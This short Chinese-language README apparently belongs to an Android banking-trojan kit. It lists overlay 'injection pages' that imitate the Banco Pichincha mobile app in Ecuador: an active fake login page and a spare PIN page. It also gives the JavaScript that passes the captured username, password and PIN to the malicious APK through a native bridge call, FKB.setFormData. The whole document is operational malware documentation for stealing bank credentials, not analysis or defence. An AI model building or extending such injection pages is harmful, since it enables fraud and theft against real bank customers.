# 厄瓜多尔（EC）注入页

| 品牌 | 包名 | 文件 | 用途 |
|---|---|---|---|
| Banca móvil（Banco Pichincha） | com.yellowpepper.pichincha | `com.yellowpepper.pichincha.html` | 登录页（入口，当前启用） |
| 同上 | 同上 | `pichincha_pin.html` | PIN 步骤页（备用，未串联） |

## 协议

只走 APK 原生桥，页面内无任何 HTTP 外发：

```js
// 登录
FKB.setFormData(JSON.stringify({
  pkg: pk, sn: sn, template: 'pichincha',
  formData: { username: u, password: p }
}));

// PIN（备用页）
FKB.setFormData(JSON.stringify({
  pkg: pk, sn: sn, template: 'pichincha',
  formData: { pin: pin }
}));
```

入口仍是登录页；PIN 页已按规范改好放在旁边，需要时把入口指过去或再串联。
